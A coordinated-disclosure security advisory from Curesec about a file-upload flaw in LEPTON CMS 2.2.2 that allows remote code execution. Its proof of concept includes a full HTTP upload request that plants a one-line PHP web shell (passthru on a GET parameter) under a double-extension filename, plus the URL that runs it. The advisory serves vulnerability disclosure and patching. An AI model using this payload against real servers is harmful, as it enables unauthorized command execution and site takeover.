@@ -1,0 +1,80 @@
+Security Advisory - Curesec Research Team
+
+1. Introduction
+
+Affected Product:   LEPTON 2.2.2 stable
+Fixed in:           2.3.0
+Fixed Version Link: http://www.lepton-cms.org/posts/important-lepton-2.3.0-101.php
+Vendor Website:     http://www.lepton-cms.org/
+Vulnerability Type: Code Execution
+Remote Exploitable: Yes
+Reported to vendor: 09/05/2016
+Disclosed to        11/10/2016
+public:
+Release mode:       Coordinated Release
+CVE:                n/a
+Credits             Tim Coen of Curesec GmbH
+
+2. Overview
+
+Lepton is a content management system written in PHP. In version 2.2.2, it is
+vulnerable to code execution as it is possible to upload files with dangerous
+type via the media manager.
+
+3. Details
+
+Upload of file with dangerous type
+
+CVSS: High 9.0 AV:N/AC:L/Au:S/C:C/I:C/A:C
+
+Description: When uploading a file in the media tab, there is a client-side as
+well as a server-side extension check. The server-side check can be bypassed by
+including a valid extension before the desired extension, leading to code
+execution or XSS.
+
+Proof of Concept:
+
+POST /LEPTON_stable_2.2.2/upload/admins/media/index.php?leptoken=
+099c871bbf640f2f91d2az1472132032 HTTP/1.1 Host: localhost Accept-Language:
+en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: lep9131sessionid=
+8bgkd5rae5nhbn0jaac8jpkpc5 Connection: close Content-Type: multipart/form-data;
+boundary=---------------------------38397165016927337851258279296
+Content-Length: 613 -----------------------------38397165016927337851258279296
+Content-Disposition: form-data; name="action" media_upload
+-----------------------------38397165016927337851258279296 Content-Disposition:
+form-data; name="current_dir"
+-----------------------------38397165016927337851258279296 Content-Disposition:
+form-data; name="upload[]"; filename="test.png.php5" Content-Type: image/png <?
+php passthru($_GET['x']);
+-----------------------------38397165016927337851258279296 Content-Disposition:
+form-data; name="submit" Upload File(s)
+-----------------------------38397165016927337851258279296-- http://localhost/
+LEPTON_stable_2.2.2/upload/media/test.png.php5?x=id
+
+4. Solution
+
+To mitigate this issue please upgrade at least to version 2.3.0:
+
+http://www.lepton-cms.org/posts/important-lepton-2.3.0-101.php
+
+Please note that a newer version might already be available.
+
+5. Report Timeline
+
+09/05/2016 Informed Vendor about Issue
+09/06/2016 Vendor requests 60 days to release fix
+10/25/2016 Vendor releases fix
+11/10/2016 Disclosed to public
+
+
+Blog Reference:
+https://www.curesec.com/blog/article/blog/Lepton-222-Code-Execution-171.html
+ 
+--
+blog:  https://www.curesec.com/blog
+tweet: https://twitter.com/curesec
+
+Curesec GmbH
+Curesec Research Team
+Josef-Orlopp-Straße 54
+10365 Berlin, Germany
